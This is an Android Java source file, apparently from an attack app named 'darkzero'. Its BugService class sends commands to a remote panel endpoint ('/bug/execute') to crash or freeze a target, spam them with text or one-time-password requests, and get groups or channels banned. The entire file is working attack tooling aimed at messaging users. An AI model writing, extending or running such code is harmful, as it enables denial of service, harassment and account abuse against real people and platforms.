package com.darkzero.services;

import android.content.Context;
import okhttp3.*;
import java.io.IOException;

public class BugService {
    private Context context;
    private OkHttpClient client;

    public BugService(Context context) {
        this.context = context;
        this.client = new OkHttpClient();
    }

    public void executeCrash(String target) {
        String payload = "{\"action\":\"crash\",\"target\":\"" + target + "\"}";
        sendPayload(payload);
    }

    public void executeFreeze(String target) {
        String payload = "{\"action\":\"freeze\",\"target\":\"" + target + "\"}";
        sendPayload(payload);
    }

    public void executeSpamText(String target, String text) {
        String payload = "{\"action\":\"spam_text\",\"target\":\"" + target + "\",\"message\":\"" + text + "\"}";
        sendPayload(payload);
    }

    public void executeSpamOtp(String target) {
        String payload = "{\"action\":\"spam_otp\",\"target\":\"" + target + "\"}";
        sendPayload(payload);
    }

    public void executeBannedGroup(String groupId) {
        String payload = "{\"action\":\"banned_group\",\"target\":\"" + groupId + "\"}";
        sendPayload(payload);
    }

    public void executeBannedChannel(String channelId) {
        String payload = "{\"action\":\"banned_channel\",\"target\":\"" + channelId + "\"}";
        sendPayload(payload);
    }

    private void sendPayload(String payload) {
        RequestBody body = RequestBody.create(
                payload,
                MediaType.parse("application/json; charset=utf-8")
        );

        Request request = new Request.Builder()
                .url(PterodactylService.PANEL_URL + "/bug/execute")
                .post(body)
                .build();

        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                e.printStackTrace();
            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {
                response.close();
            }
        });
    }
}